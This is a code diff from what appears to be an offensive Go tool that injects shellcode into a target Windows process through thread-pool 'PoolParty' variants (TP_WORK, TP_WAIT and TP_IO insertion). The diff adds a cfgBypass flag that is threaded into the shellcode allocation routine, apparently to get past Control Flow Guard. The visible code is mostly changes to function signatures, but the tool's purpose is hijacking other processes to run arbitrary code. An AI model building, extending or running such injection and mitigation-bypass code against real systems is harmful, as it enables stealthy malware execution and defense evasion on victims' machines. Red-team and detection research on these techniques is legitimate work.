@@ -66,7 +66,7 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 }
 
 // executeVariant2 implements TP_WORK Insertion
-func executeVariant2(shellcode []byte, pid uint32) (string, error) {
+func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
 	hProcess, output, err := poolPartyInit(2, "TP_WORK Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
@@ -117,7 +117,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Read target process's task queue structure\n"
 
 	// Step 6+7: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
 	if err != nil {
 		return output, err
 	}
@@ -255,7 +255,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 }
 
 // executeVariant3 implements TP_WAIT Insertion via Event signaling
-func executeVariant3(shellcode []byte, pid uint32) (string, error) {
+func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
 	hProcess, output, err := poolPartyInit(3, "TP_WAIT Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
@@ -271,7 +271,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3+4: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
 	if err != nil {
 		return output, err
 	}
@@ -364,7 +364,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 }
 
 // executeVariant4 implements TP_IO Insertion via File I/O completion
-func executeVariant4(shellcode []byte, pid uint32) (string, error) {
+func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
 	hProcess, output, err := poolPartyInit(4, "TP_IO Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
@@ -380,7 +380,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3+4: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
 	if err != nil {
 		return output, err
 	}
